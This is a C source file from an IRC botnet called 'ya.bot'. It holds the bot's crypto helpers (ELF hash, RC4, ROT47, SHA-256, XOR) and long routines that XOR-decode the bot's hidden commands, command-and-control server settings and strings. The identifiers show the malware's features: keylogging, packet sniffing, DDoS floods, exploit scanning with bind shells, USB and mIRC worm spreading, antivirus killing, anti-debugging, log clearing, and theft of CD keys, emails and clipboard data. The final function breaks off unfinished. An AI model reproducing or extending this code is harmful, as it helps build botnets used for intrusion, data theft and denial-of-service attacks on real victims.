/*  ya.bot  */

#include "..\bot\bot.h"

DWORD crypto_elfhash(char *pszBuffer)
{
	DWORD dwHash = 0, dwStore;

#ifndef NO_DEBUG
		debug_print("Hashing using ELF Hash, crypto_elfhash()");
#endif

	if (!pszBuffer)
			return 0;
	while (*pszBuffer)
	{
			dwHash = (dwHash << 4) + *pszBuffer++;
		if (dwStore = dwHash & 0xF0000000)
				dwHash ^= dwStore >> 24;
			dwHash &= ~dwStore;
	}
		return dwHash;
}

#ifndef NO_CRYPTORC4
void crypto_rc4(char *pszBuffer, DWORD dwBufferLength, char *pszKey, DWORD dwKeyLength)
{
	struct rc4_state rc4s;

#ifndef NO_DEBUG
		debug_print("RC4, crypto_xor()");
#endif

		rc4_setup(&rc4s, (unsigned char *)pszKey, dwKeyLength);
		rc4_crypt(&rc4s, (unsigned char *)pszBuffer, dwBufferLength);
		return;
}
#endif

void crypto_rot47(char *pszBuffer)
{
	int c, i;

#ifndef NO_DEBUG
		debug_print("ROT47, crypto_rot47()");
#endif


	if (!pszBuffer)
			return;
	for (i = 0; i < (int)strlen(pszBuffer); i++)
	{
			c = pszBuffer[i];
		if ((c >= '!') && (c <= 'O'))
				pszBuffer[i] += 47;
		else if ((c >= 'P') && (c <= '~'))
				pszBuffer[i] -= 47;
	}
		return;
}

#ifndef NO_CRYPTOSHA256
void crypto_sha256(char *pszData, DWORD dwDataLength, char *pszBuffer, DWORD dwBufferSize)
{
	char szChar[4], szFinal[32];
	int i;
	sha256_context ctx;
	unsigned char szHash[32];

#ifndef NO_DEBUG
		debug_print("Hashing using SHA-256, crypto_sha256()");
#endif

		sha256_starts(&ctx);
		sha256_update(&ctx, (unsigned char *)pszData, dwDataLength);
		sha256_finish(&ctx, (unsigned char *)szHash);
		sha256_starts(&ctx);
		memset(szFinal, 0, sizeof(szFinal));
	for (i = 0; i < 32; i++)
	{
			memset(szChar, 0, sizeof(szChar));
			_snprintf(szChar, sizeof(szChar) - 1, string_sha256char, szHash[i]);
			strncat(szFinal, szChar, (sizeof(szFinal) - strlen(szFinal)) - 1);
	}
		strncpy(pszBuffer, szFinal, dwBufferSize);
		return;
}
#endif

inline void crypto_xor(char *pszBuffer, int nKey)
{
	int i;
	if (!pszBuffer)
			return;
	for (i = 0; i < (int)strlen(pszBuffer); i++)
			pszBuffer[i] ^= nKey;
		return;
}

void crypto_xorcommands()
{
		crypto_xor((char *)cmd_botlogin, xorkey);
		crypto_xor((char *)cmd_botdie, xorkey);
		crypto_xor((char *)cmd_botdisconnect, xorkey);
		crypto_xor((char *)cmd_botdns, xorkey);
		crypto_xor((char *)cmd_botinfo, xorkey);
		crypto_xor((char *)cmd_botlogout, xorkey);
		crypto_xor((char *)cmd_botraw, xorkey);
		crypto_xor((char *)cmd_botremove, xorkey);
		crypto_xor((char *)cmd_botsystem, xorkey);

#ifndef NO_DCC
		crypto_xor((char *)cmd_dccsend, xorkey);
		crypto_xor((char *)cmd_dccstop, xorkey);
#endif

		crypto_xor((char *)cmd_filedelete, xorkey);
#ifndef NO_FILEFIND
		crypto_xor((char *)cmd_filefind, xorkey);
#endif
		crypto_xor((char *)cmd_fileopen, xorkey);

#ifndef NO_FTP
		crypto_xor((char *)cmd_ftpdownload, xorkey);
		crypto_xor((char *)cmd_ftpupdate, xorkey);
		crypto_xor((char *)cmd_ftpupload, xorkey);
#endif

#ifndef NO_HTTP
		crypto_xor((char *)cmd_httpdownload, xorkey);
		crypto_xor((char *)cmd_httpupdate, xorkey);
		crypto_xor((char *)cmd_httpvisit, xorkey);
#endif

#ifndef NO_INFO
		crypto_xor((char *)cmd_infonet, xorkey);
		crypto_xor((char *)cmd_infosys, xorkey);
#endif

#ifndef NO_KEYLOG
		crypto_xor((char *)cmd_keylogsign, xorkey);
		crypto_xor((char *)cmd_keylogstart, xorkey);
		crypto_xor((char *)cmd_keylogstop, xorkey);
#endif

#ifndef NO_LOGIC
		crypto_xor((char *)cmd_logicif, xorkey);
#endif

		crypto_xor((char *)cmd_processkillpid, xorkey);
		crypto_xor((char *)cmd_processlist, xorkey);
		crypto_xor((char *)cmd_processtart, xorkey);

#ifndef NO_PSNIFF
		crypto_xor((char *)cmd_psniffstart, xorkey);
		crypto_xor((char *)cmd_psniffstop, xorkey);
#endif

#ifndef NO_SPEEDTEST
		crypto_xor((char *)cmd_speedtesthttp, xorkey);
#endif

		crypto_xor((char *)cmd_threadkill, xorkey);
		crypto_xor((char *)cmd_threadlist, xorkey);

#ifndef NO_DAEMONSOCKS4
		crypto_xor((char *)cmd_socks4dstart, xorkey);
		crypto_xor((char *)cmd_socks4dstop, xorkey);
#endif

#ifndef NO_BANDWITHFLOOD
		crypto_xor((char *)cmd_ddosbandwith, xorkey);
#endif
		crypto_xor((char *)cmd_ddosstop, xorkey);
#ifndef NO_SYNACKFLOOD
		crypto_xor((char *)cmd_ddossynack, xorkey);
#endif
#ifndef NO_TROLLFLOOD
		crypto_xor((char *)cmd_ddostroll, xorkey);
#endif
#ifndef NO_UDPKFLOOD
		crypto_xor((char *)cmd_ddosudp, xorkey);
#endif

#ifndef NO_BOTKILLER
		crypto_xor((char *)cmd_botkillerstart, xorkey);
		crypto_xor((char *)cmd_botkillerstop, xorkey);
#endif

#ifndef NO_EXPSCAN
		crypto_xor((char *)cmd_expscancip, xorkey);
		crypto_xor((char *)cmd_expscanstart, xorkey);
		crypto_xor((char *)cmd_expscanstop, xorkey);
#endif
#ifndef NO_MIRCSCAN
		crypto_xor((char *)cmd_mircscanstart, xorkey);
		crypto_xor((char *)cmd_mircscanstop, xorkey);
#endif
#ifndef NO_USBSCAN
		crypto_xor((char *)cmd_usbscanstart, xorkey);
		crypto_xor((char *)cmd_usbscanstop, xorkey);
#endif
		crypto_xor((char *)cmd_scanstats, xorkey);

		crypto_xor((char *)cmd_snagall, xorkey);
#ifndef NO_SNAGCDKEYS
		crypto_xor((char *)cmd_snagcdkeys, xorkey);
#endif
#ifndef NO_SNAGCLIPBOARD
		crypto_xor((char *)cmd_snagclipboard, xorkey);
#endif
#ifndef NO_SNAGEMAILS
		crypto_xor((char *)cmd_snagemails, xorkey);
#endif
#ifndef NO_SNAGMSN
		crypto_xor((char *)cmd_snagmsn, xorkey);
#endif
#ifndef NO_SNAGSTORAGE
		crypto_xor((char *)cmd_snagstorage, xorkey);
#endif

#ifndef NO_INSTALLWORMRIDE
		crypto_xor((char *)cmd_wormridestart, xorkey);
		crypto_xor((char *)cmd_wormridestop, xorkey);
#endif

}

void crypto_xorconfig()
{
	int i = 0;
		crypto_xor((char *)botid, xorkey);
		crypto_xor((char *)botnick, xorkey);
		crypto_xor((char *)commandprefix, xorkey);
		crypto_xor((char *)versionreply, xorkey);

	while (hostauth[i])
	{
			crypto_xor((char *)hostauth[i], xorkey);
			i++;
	}

		crypto_xor((char *)botfilename, xorkey);
		crypto_xor((char *)botstartupname, xorkey);
		crypto_xor((char *)driverfilename, xorkey);
		crypto_xor((char *)driverservicename, xorkey);
		crypto_xor((char *)wormridefilename, xorkey);

		i = 0;
	while (rgSServerList[i].m_pszServer)
	{
			crypto_xor((char *)rgSServerList[i].m_pszServer, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszServerPassword, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszBotChannel, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszBotChannelKey, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszExploitChannel, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszKeyLogChannel, xorkey);
			crypto_xor((char *)rgSServerList[i].m_pszPSniffChannel, xorkey);
			i++;
	}

		crypto_xor((char *)daemonftpuser, xorkey);
		crypto_xor((char *)daemonftppass, xorkey);
		crypto_xor((char *)daemonhttpfilename, xorkey);

		crypto_xor((char *)debuglogfilename, xorkey);
}

void crypto_xorstrings()
{

#ifndef NO_DEBUG
		crypto_xor((char *)string_debugdate, xorkey);
		crypto_xor((char *)string_debugtime, xorkey);
		crypto_xor((char *)string_debugprint, xorkey);
		crypto_xor((char *)string_debugfileappend, xorkey);
#endif

		crypto_xor((char *)string_mainmutex, xorkey);

		crypto_xor((char *)string_installregistrystartup, xorkey);
		crypto_xor((char *)string_installregistrysafebootminimal, xorkey);
		crypto_xor((char *)string_installregistrysafebootnetwork, xorkey);
		crypto_xor((char *)string_installresourcetype, xorkey);
		crypto_xor((char *)string_installmeltcommand, xorkey);
		crypto_xor((char *)string_installmeltcomspec, xorkey);

#ifndef NO_INSTALLDRIVER
		crypto_xor((char *)string_installdriverresourcename, xorkey);
#endif

#ifndef NO_INSTALLWORMRIDE
		crypto_xor((char *)string_installwormrideresourcename, xorkey);
		crypto_xor((char *)string_wormridealreadyrunning, xorkey);
		crypto_xor((char *)string_wormridefailed, xorkey);
		crypto_xor((char *)string_wormridestarted, xorkey);
		crypto_xor((char *)string_wormridefinished, xorkey);
		crypto_xor((char *)string_wormridestopped, xorkey);
		crypto_xor((char *)string_wormridenotrunning, xorkey);
#endif

		crypto_xor((char *)string_ircaction, xorkey);
		crypto_xor((char *)string_ircmessage, xorkey);
		crypto_xor((char *)string_ircnicknumber, xorkey);
		crypto_xor((char *)string_ircnicklan, xorkey);
		crypto_xor((char *)string_ircnickmodem, xorkey);
		crypto_xor((char *)string_ircnickdirect, xorkey);
		crypto_xor((char *)string_ircnicknt, xorkey);
		crypto_xor((char *)string_ircnick2k, xorkey);
		crypto_xor((char *)string_ircnick03, xorkey);
		crypto_xor((char *)string_ircnickvs, xorkey);
		crypto_xor((char *)string_ircnickquestionmarks, xorkey);
		crypto_xor((char *)string_ircnickextended, xorkey);
		crypto_xor((char *)string_ircnickgood, xorkey);
		crypto_xor((char *)string_ircnickuptime, xorkey);
		crypto_xor((char *)string_ircuserinfo, xorkey);
		crypto_xor((char *)string_ircjoin, xorkey);
		crypto_xor((char *)string_ircpingserver, xorkey);
		crypto_xor((char *)string_ircping, xorkey);
		crypto_xor((char *)string_ircpong, xorkey);
		crypto_xor((char *)string_ircmotd, xorkey);
		crypto_xor((char *)string_ircnomotd, xorkey);
		crypto_xor((char *)string_ircnickinuse, xorkey);
		crypto_xor((char *)string_ircnotregistered, xorkey);
		crypto_xor((char *)string_ircbannedfromchannel, xorkey);
		crypto_xor((char *)string_ircwrongchannelkey, xorkey);
		crypto_xor((char *)string_irctopicset, xorkey);
		crypto_xor((char *)string_irckick, xorkey);
		crypto_xor((char *)string_ircpart, xorkey);
		crypto_xor((char *)string_ircquit, xorkey);
		crypto_xor((char *)string_ircnotice, xorkey);
		crypto_xor((char *)string_ircprivmsg, xorkey);
		crypto_xor((char *)string_ircclientping, xorkey);
		crypto_xor((char *)string_ircclientpong, xorkey);
		crypto_xor((char *)string_ircclientversion, xorkey);
		crypto_xor((char *)string_ircclientversionresponse, xorkey);
		crypto_xor((char *)string_ircdelayresponse, xorkey);
		crypto_xor((char *)string_ircsilentresponse, xorkey);
		crypto_xor((char *)string_ircverboseresponse, xorkey);

#ifndef NO_TOPIC
		crypto_xor((char *)string_irctopiccommand, xorkey);
		crypto_xor((char *)string_ircmutlitopicseperator, xorkey);
		crypto_xor((char *)string_ircmutlitopiccommand, xorkey);
#endif

		crypto_xor((char *)string_threadbotmain, xorkey);
		crypto_xor((char *)string_threadircping, xorkey);
#ifndef NO_ANTIDEBUG
		crypto_xor((char *)string_threadantidebugdetectdebugger, xorkey);
#endif
#ifndef NO_DCC
		crypto_xor((char *)string_threaddccget, xorkey);
		crypto_xor((char *)string_threaddccsend, xorkey);
#endif
#ifndef NO_FILEFIND
		crypto_xor((char *)string_threadfilefindmain, xorkey);
#endif
#ifndef NO_FTP
		crypto_xor((char *)string_threadftpdownload, xorkey);
		crypto_xor((char *)string_threadftpupdate, xorkey);
		crypto_xor((char *)string_threadftpupload, xorkey);
#endif
#ifndef NO_HTTP
		crypto_xor((char *)string_threadhttpdownload, xorkey);
		crypto_xor((char *)string_threadhttpupdate, xorkey);
#endif
#ifndef NO_KEYLOG
		crypto_xor((char *)string_threadkeylogmain, xorkey);
#endif
#ifndef NO_PSNIFF
		crypto_xor((char *)string_threadpsniffmain, xorkey);
#endif
#ifndef NO_SECURE
		crypto_xor((char *)string_threadsecuremain, xorkey);
#endif
#ifndef NO_DAEMONFTP
		crypto_xor((char *)string_threaddaemonftpmain, xorkey);
#endif
#ifndef NO_DAEMONHTTP
		crypto_xor((char *)string_threaddaemonhttpmain, xorkey);
#endif
#ifndef NO_DAEMONIDENT
		crypto_xor((char *)string_threaddaemonidentmain, xorkey);
#endif
#ifndef NO_DAEMONSOCKS4
		crypto_xor((char *)string_threaddaemonsocks4main, xorkey);
#endif
#ifndef NO_BANDWITHFLOOD
		crypto_xor((char *)string_threadbandwithfloodmain, xorkey);
#endif
#ifndef NO_SYNACKFLOOD
		crypto_xor((char *)string_threadsynackfloodmain, xorkey);
#endif
#ifndef NO_TROLLFLOOD
		crypto_xor((char *)string_threadtrollfloodmain, xorkey);
#endif
#ifndef NO_UDPFLOOD
		crypto_xor((char *)string_threadudpfloodmain, xorkey);
#endif
#ifndef NO_AVKILLER
		crypto_xor((char *)string_threadavkillermain, xorkey);
#endif
#ifndef NO_BOTKILLER
		crypto_xor((char *)string_threadbotkillermain, xorkey);
#endif
#ifndef NO_EXPSCAN
		crypto_xor((char *)string_threadexpscanmain, xorkey);
#endif
#ifndef NO_MIRCSCAN
		crypto_xor((char *)string_threadmircscanmain, xorkey);
#endif
#ifndef NO_USBSCAN
		crypto_xor((char *)string_threadusbscanmain, xorkey);
#endif
#ifndef NO_INSTALLWORMRIDE
		crypto_xor((char *)string_threadwormridemain, xorkey);
#endif

		crypto_xor((char *)string_replymain, xorkey);
		crypto_xor((char *)string_replyfile, xorkey);
#ifndef NO_DCC
		crypto_xor((char *)string_replydcc, xorkey);
#endif
#ifndef NO_FTP
		crypto_xor((char *)string_replyftp, xorkey);
#endif
#ifndef NO_HTTP
		crypto_xor((char *)string_replyhttp, xorkey);
#endif
#ifndef NO_INFO
		crypto_xor((char *)string_replyinfo, xorkey);
#endif
#ifndef NO_KEYLOG
		crypto_xor((char *)string_replykeylog, xorkey);
#endif
		crypto_xor((char *)string_replyprocess, xorkey);
#ifndef NO_PSNIFF
		crypto_xor((char *)string_replypsniff, xorkey);
#endif
#ifndef NO_SPEEDTEST
		crypto_xor((char *)string_replyspeedtest, xorkey);
#endif
		crypto_xor((char *)string_replythread, xorkey);
#ifndef NO_DAEMONFTP
		crypto_xor((char *)string_replyftpd, xorkey);
#endif
#ifndef NO_DAEMONHTTP
		crypto_xor((char *)string_replyhttpd, xorkey);
#endif
#ifndef NO_DAEMONSOCKS4
		crypto_xor((char *)string_replysocks4d, xorkey);
#endif
		crypto_xor((char *)string_replyddos, xorkey);
#ifndef NO_BOTKILLER
		crypto_xor((char *)string_replybotkiller, xorkey);
#endif
#ifndef NO_EXPSCAN
		crypto_xor((char *)string_replyexpscan, xorkey);
		crypto_xor((char *)string_replytransfer, xorkey);
#endif
#ifndef NO_MIRCSCAN
		crypto_xor((char *)string_replymircscan, xorkey);
#endif
#ifndef NO_USBSCAN
		crypto_xor((char *)string_replyusbscan, xorkey);
#endif
		crypto_xor((char *)string_replyscan, xorkey);
		crypto_xor((char *)string_replysnag, xorkey);
#ifndef NO_INSTALLWORMRIDE
		crypto_xor((char *)string_replywormride, xorkey);
#endif
		crypto_xor((char *)string_replydotbot, xorkey);

		crypto_xor((char *)string_botquitmsg, xorkey);
		crypto_xor((char *)string_botloggedin, xorkey);
		crypto_xor((char *)string_botloggedout, xorkey);
		crypto_xor((char *)string_botdnsresolved, xorkey);
		crypto_xor((char *)string_botdnsfailed, xorkey);
		crypto_xor((char *)string_botinfo, xorkey);
		crypto_xor((char *)string_botremovingbot, xorkey);
		crypto_xor((char *)string_botremovefailed, xorkey);
		crypto_xor((char *)string_botsystemcommand, xorkey);

		crypto_xor((char *)string_user32library, xorkey);
#ifndef NO_ANTIDEBUG
		crypto_xor((char *)string_antidebugmessageboxafunction, xorkey);
		crypto_xor((char *)string_antidebugsofticepath, xorkey);
#endif

#ifndef NO_DCC
		crypto_xor((char *)string_dccrequest, xorkey);
		crypto_xor((char *)string_dccsend, xorkey);
		crypto_xor((char *)string_dccalreadyrunning, xorkey);
		crypto_xor((char *)string_dccparameters, xorkey);
		crypto_xor((char *)string_dccstarted, xorkey);
		crypto_xor((char *)string_dccfailed, xorkey);
		crypto_xor((char *)string_dccfinished, xorkey);
		crypto_xor((char *)string_dccstopped, xorkey);
		crypto_xor((char *)string_dccnotrunning, xorkey);
#endif

		crypto_xor((char *)string_filefopenreadbinary, xorkey);
		crypto_xor((char *)string_filefopenreadwritebinary, xorkey);
		crypto_xor((char *)string_filefopenwritebinary, xorkey);
		crypto_xor((char *)string_filepath, xorkey);
		crypto_xor((char *)string_fileopen, xorkey);
		crypto_xor((char *)string_filedeleted, xorkey);
		crypto_xor((char *)string_fileunabletodelete, xorkey);
#ifndef NO_FILEFIND
		crypto_xor((char *)string_filesearchingforfile, xorkey);
		crypto_xor((char *)string_filefinddirectory, xorkey);
		crypto_xor((char *)string_filefoundfile, xorkey);
		crypto_xor((char *)string_fileendofsearch, xorkey);
		crypto_xor((char *)string_filealreadysearchingforfile, xorkey);
#endif
		crypto_xor((char *)string_fileopened, xorkey);
		crypto_xor((char *)string_fileunabletoopen, xorkey);

#ifndef NO_FTP
		crypto_xor((char *)string_ftpupdatefile, xorkey);
		crypto_xor((char *)string_ftpretr, xorkey);
		crypto_xor((char *)string_ftpstor, xorkey);
		crypto_xor((char *)string_ftpretrievedfile, xorkey);
		crypto_xor((char *)string_ftpretrievedupdate, xorkey);
		crypto_xor((char *)string_ftpstoredfile, xorkey);
		crypto_xor((char *)string_ftpunabletoretrieve, xorkey);
		crypto_xor((char *)string_ftpunabletostore, xorkey);
		crypto_xor((char *)string_ftpalreadytransferringfile, xorkey);
#endif

#ifndef NO_HTTP
		crypto_xor((char *)string_httpupdatefile, xorkey);
		crypto_xor((char *)string_httpdownloading, xorkey);
		crypto_xor((char *)string_httpdownloadedfile, xorkey);
		crypto_xor((char *)string_httpdownloadedupdate, xorkey);
		crypto_xor((char *)string_httpunabletodownload, xorkey);
		crypto_xor((char *)string_httpalreadydownloadingfile, xorkey);
		crypto_xor((char *)string_httpagent, xorkey);
		crypto_xor((char *)string_httpvisited, xorkey);
		crypto_xor((char *)string_httpunabletovisit, xorkey);
#endif

#ifndef NO_INFO
		crypto_xor((char *)string_infoquestionmarks, xorkey);
		crypto_xor((char *)string_infonet, xorkey);
		crypto_xor((char *)string_infowindowsbuild, xorkey);
		crypto_xor((char *)string_infowindowsnt, xorkey);
		crypto_xor((char *)string_infowindows2000, xorkey);
		crypto_xor((char *)string_infowindowsxp, xorkey);
		crypto_xor((char *)string_infowindows2003, xorkey);
		crypto_xor((char *)string_infowindowsvista, xorkey);
		crypto_xor((char *)string_infoinfecteddate, xorkey);
		crypto_xor((char *)string_infoinfectedsubkey, xorkey);
		crypto_xor((char *)string_infoinfectedvaluename, xorkey);
		crypto_xor((char *)string_infosys, xorkey);
#endif

		crypto_xor((char *)string_kernel32library, xorkey);
		crypto_xor((char *)string_injectfreelibraryfunction, xorkey);
		crypto_xor((char *)string_injectloadlibraryfunction, xorkey);

#ifndef NO_KEYLOG
		crypto_xor((char *)string_keylogalreadyrunning, xorkey);
		crypto_xor((char *)string_keylogfailed, xorkey);
		crypto_xor((char *)string_keylogstarted, xorkey);
		crypto_xor((char *)string_keylogsignaturestarted, xorkey);
		crypto_xor((char *)string_keylogcaption, xorkey);
		crypto_xor((char *)string_keyloglog, xorkey);
		crypto_xor((char *)string_keylogsignature, xorkey);
		crypto_xor((char *)string_keylogstopped, xorkey);
		crypto_xor((char *)string_keylognotrunning, xorkey);
#endif

#ifndef NO_LOGIC
		crypto_xor((char *)string_logiccpu, xorkey);
		crypto_xor((char *)string_logicdisk, xorkey);
		crypto_xor((char *)string_logichost, xorkey);
		crypto_xor((char *)string_logicid, xorkey);
		crypto_xor((char *)string_logicip, xorkey);
		crypto_xor((char *)string_logicnick, xorkey);
		crypto_xor((char *)string_logicram, xorkey);
		crypto_xor((char *)string_logicuptime, xorkey);
		crypto_xor((char *)string_logiccommand, xorkey);
#endif

#ifndef NO_CLEARLOGS
		crypto_xor((char *)string_miscclearlogapplication, xorkey);
		crypto_xor((char *)string_miscclearlogsecurity, xorkey);
		crypto_xor((char *)string_miscclearlogsystem, xorkey);
#endif
		crypto_xor((char *)string_miscdebugprivilege, xorkey);
		crypto_xor((char *)string_miscshutdownprivilege, xorkey);
		crypto_xor((char *)string_miscurlmonlibrary, xorkey);
		crypto_xor((char *)string_miscurldownloadfunction, xorkey);

		crypto_xor((char *)string_netutilsfpchar, xorkey);
		crypto_xor((char *)string_netutilsfpwinnt, xorkey);
		crypto_xor((char *)string_netutilsfpwin2000, xorkey);
		crypto_xor((char *)string_netutilsfpwinxp, xorkey);
		crypto_xor((char *)string_netutilsfpwin2003, xorkey);
		crypto_xor((char *)string_netutilsfpwinvista, xorkey);
		crypto_xor((char *)string_netutilsipgetsockip, xorkey);
		crypto_xor((char *)string_netutilsipprivateclassa, xorkey);
		crypto_xor((char *)string_netutilsipprivateclassb, xorkey);
		crypto_xor((char *)string_netutilsipprivateclassc, xorkey);
		crypto_xor((char *)string_netutilsnullsessionipc, xorkey);

#ifndef NO_PATCH
		crypto_xor((char *)string_patchsfcoslibrary, xorkey);
		crypto_xor((char *)string_patchsleepfunction, xorkey);
		crypto_xor((char *)string_patchtcpipfile, xorkey);
#endif

#ifndef NO_PERSIST
		crypto_xor((char *)string_persistclosehandle, xorkey);
		crypto_xor((char *)string_persistcreatefilea, xorkey);
		crypto_xor((char *)string_persistcreatemutexa, xorkey);
		crypto_xor((char *)string_persistgetlasterror, xorkey);
		crypto_xor((char *)string_persistreleasemutex, xorkey);
		crypto_xor((char *)string_persistsleep, xorkey);
		crypto_xor((char *)string_persistwinexec, xorkey);
		crypto_xor((char *)string_persistclassname, xorkey);
#endif

		crypto_xor((char *)string_processkilled, xorkey);
		crypto_xor((char *)string_processunabletokill, xorkey);
		crypto_xor((char *)string_processlistingprocesses, xorkey);
		crypto_xor((char *)string_processlistfailed, xorkey);
		crypto_xor((char *)string_processlistprocess, xorkey);
		crypto_xor((char *)string_processendofprocesslist, xorkey);
		crypto_xor((char *)string_processtarted, xorkey);
		crypto_xor((char *)string_processunabletostart, xorkey);

#ifndef NO_PSNIFF
		crypto_xor((char *)string_psniffalreadyrunning, xorkey);
		crypto_xor((char *)string_psniffailed, xorkey);
		crypto_xor((char *)string_psniffstarted , xorkey);
		crypto_xor((char *)string_psniffpacket, xorkey);
		crypto_xor((char *)string_psniffstopped, xorkey);
		crypto_xor((char *)string_psniffnotrunning, xorkey);
#endif

#ifndef NO_RING0
		crypto_xor((char *)string_ring0ntdlllibrary, xorkey);
		crypto_xor((char *)string_ring0keservicedescriptortablefunction, xorkey);
		crypto_xor((char *)string_ring0psinitialsystemprocessfunction, xorkey);
#endif

#ifndef NO_SECURE
		crypto_xor((char *)string_securenonullsessionsubkey, xorkey);
		crypto_xor((char *)string_securenonullsessionvaluename, xorkey);
		crypto_xor((char *)string_securenodcomsubkey, xorkey);
		crypto_xor((char *)string_securenodcomvaluename, xorkey);
		crypto_xor((char *)string_securenonetbtsubkey, xorkey);
		crypto_xor((char *)string_securenonetbtvaluename, xorkey);
#endif

#ifndef NO_SPEEDTEST
		crypto_xor((char *)string_speedtestgettinghttpspeed, xorkey);
		crypto_xor((char *)string_speedtesthttprequest, xorkey);
		crypto_xor((char *)string_speedtesthttpspeedtest, xorkey);
#endif

		crypto_xor((char *)string_threadkilled, xorkey);
		crypto_xor((char *)string_threadunabletokill, xorkey);
		crypto_xor((char *)string_threadlistingthreads, xorkey);
		crypto_xor((char *)string_threadlistthread, xorkey);
		crypto_xor((char *)string_threadendofthreadlist, xorkey);

#ifndef NO_CRYPTOSHA256
		crypto_xor((char *)string_sha256char, xorkey);
#endif

		crypto_xor((char *)string_setip, xorkey);

#ifndef NO_DAEMONFTP
		crypto_xor((char *)string_daemonftp220, xorkey);
		crypto_xor((char *)string_daemonftpuser, xorkey);
		crypto_xor((char *)string_daemonftp331, xorkey);
		crypto_xor((char *)string_daemonftppass, xorkey);
		crypto_xor((char *)string_daemonftp230, xorkey);
		crypto_xor((char *)string_daemonftpport, xorkey);
		crypto_xor((char *)string_daemonftpportinfo, xorkey);
		crypto_xor((char *)string_daemonftp200, xorkey);
		crypto_xor((char *)string_daemonftpretr, xorkey);
		crypto_xor((char *)string_daemonftp150, xorkey);
		crypto_xor((char *)string_daemonftp226, xorkey);
		crypto_xor((char *)string_daemonftp425, xorkey);
		crypto_xor((char *)string_daemonftp221, xorkey);
		crypto_xor((char *)string_daemonftptransferstarted, xorkey);
		crypto_xor((char *)string_daemonftptransferfinished, xorkey);
		crypto_xor((char *)string_daemonftptransferfailed, xorkey);
#endif
#ifndef NO_DAEMONHTTP
		crypto_xor((char *)string_daemonhttprequest, xorkey);
		crypto_xor((char *)string_daemonhttpheader, xorkey);
		crypto_xor((char *)string_daemonhttptransferstarted, xorkey);
		crypto_xor((char *)string_daemonhttptransferfinished, xorkey);
		crypto_xor((char *)string_daemonhttptransferfailed, xorkey);
#endif
#ifndef NO_DAEMONIDENT
		crypto_xor((char *)string_daemonidentmsg, xorkey);
#endif
#ifndef NO_DAEMONSOCKS4
		crypto_xor((char *)string_daemonsocks4alreadyrunning, xorkey);
		crypto_xor((char *)string_daemonsocks4started, xorkey);
		crypto_xor((char *)string_daemonsocks4stopped, xorkey);
		crypto_xor((char *)string_daemonsocks4notrunning, xorkey);
#endif

		crypto_xor((char *)string_ddosalreadyrunning, xorkey);
		crypto_xor((char *)string_ddosfailed, xorkey);
#ifndef NO_BANDWITHFLOOD
		crypto_xor((char *)string_ddosbandwithfloodstarted, xorkey);
		crypto_xor((char *)string_ddosbandwithfloodfilename, xorkey);
#endif
#ifndef NO_SYNACKFLOOD
		crypto_xor((char *)string_ddossynackfloodstarted, xorkey);
#endif
#ifndef NO_TROLLFLOOD
		crypto_xor((char *)string_ddostrollfloodstarted, xorkey);
#endif		
#ifndef NO_UDPFLOOD
		crypto_xor((char *)string_ddosudpfloodstarted, xorkey);
#endif
		crypto_xor((char *)string_ddosfinishedflooding, xorkey);
		crypto_xor((char *)string_ddosstopped, xorkey);
		crypto_xor((char *)string_ddosnotrunning, xorkey);

#ifndef NO_BOTKILLER
		crypto_xor((char *)string_botkilleralreadyrunning, xorkey);
		crypto_xor((char *)string_botkillerfailed, xorkey);
		crypto_xor((char *)string_botkillerstarted, xorkey);
		crypto_xor((char *)string_botkillerkilledprocess, xorkey);
		crypto_xor((char *)string_botkillerdeletedfile, xorkey);
		crypto_xor((char *)string_botkillerdeletedregistryentry, xorkey);
		crypto_xor((char *)string_botkillerfinished, xorkey);
		crypto_xor((char *)string_botkillerstopped, xorkey);
		crypto_xor((char *)string_botkillernotrunning, xorkey);
#endif

#ifndef NO_EXPSCAN
		crypto_xor((char *)string_expscanparametera, xorkey);
		crypto_xor((char *)string_expscanparameterb, xorkey);
		crypto_xor((char *)string_expscanparameterc, xorkey);
		crypto_xor((char *)string_expscanparameterr, xorkey);
		crypto_xor((char *)string_expscannullip, xorkey);
		crypto_xor((char *)string_expscancurrentlyscanning, xorkey);
		crypto_xor((char *)string_expscanalreadyrunning, xorkey);
		crypto_xor((char *)string_expscaninvalidipport, xorkey);
		crypto_xor((char *)string_expscansequentialscanstarted, xorkey);
		crypto_xor((char *)string_expscanrandomscanstarted, xorkey);
		crypto_xor((char *)string_expscanopenport, xorkey);
		crypto_xor((char *)string_expscanfinished, xorkey);
		crypto_xor((char *)string_expscanstopped, xorkey);
		crypto_xor((char *)string_expscannotrunning, xorkey);
		crypto_xor((char *)string_transferfailedtoconnect, xorkey);
		crypto_xor((char *)string_transferstarted, xorkey);
		crypto_xor((char *)string_transferfailed, xorkey);
		crypto_xor((char *)string_transferfinished, xorkey);
		crypto_xor((char *)string_bindshellcmd, xorkey);
		crypto_xor((char *)string_bindshellstart1, xorkey);
		crypto_xor((char *)string_bindshellstart2, xorkey);
#ifndef NO_EXPSCANDCOM
		crypto_xor((char *)string_expscandcomepmapper, xorkey);
#endif
#ifndef NO_EXPSCANFTP
		crypto_xor((char *)string_expscanftpdaemonfound, xorkey);
#endif
		crypto_xor((char *)string_expscansmbmachine, xorkey);
#ifndef NO_EXPSCANSMB
		crypto_xor((char *)string_expscansmbshare, xorkey);
#endif
#ifndef NO_EXPSCANSMTP
		crypto_xor((char *)string_expscansmtpdaemonfound, xorkey);
#endif
#ifndef NO_EXPSCANREALVNC
		crypto_xor((char *)string_expscanrealvncfound, xorkey);
#endif
#endif
#ifndef NO_MIRCSCAN
		crypto_xor((char *)string_mircscanalreadyrunning, xorkey);
		crypto_xor((char *)string_mircscanstarted, xorkey);
		crypto_xor((char *)string_mircscanamsg, xorkey);
		crypto_xor((char *)string_mircscanmirc, xorkey);
		crypto_xor((char *)string_mircscanfinished, xorkey);
		crypto_xor((char *)string_mircscanstopped, xorkey);
		crypto_xor((char *)string_mircscannotrunning, xorkey);
#endif
#ifndef NO_USBSCAN
		crypto_xor((char *)string_usbscanalreadyrunning, xorkey);
		crypto_xor((char *)string_usbscanstarted, xorkey);
		crypto_xor((char *)string_usbscanfloppy, xorkey);
		crypto_xor((char *)string_usbscancopyfailed, xorkey);
		crypto_xor((char *)string_usbscancopysuccessful, xorkey);
		crypto_xor((char *)string_usbscanfinished, xorkey);
		crypto_xor((char *)string_usbscanstopped, xorkey);
		crypto_xor((char *)string_usbscannotrunning, xorkey);
#endif
		crypto_xor((char *)string_scanstats, xorkey);

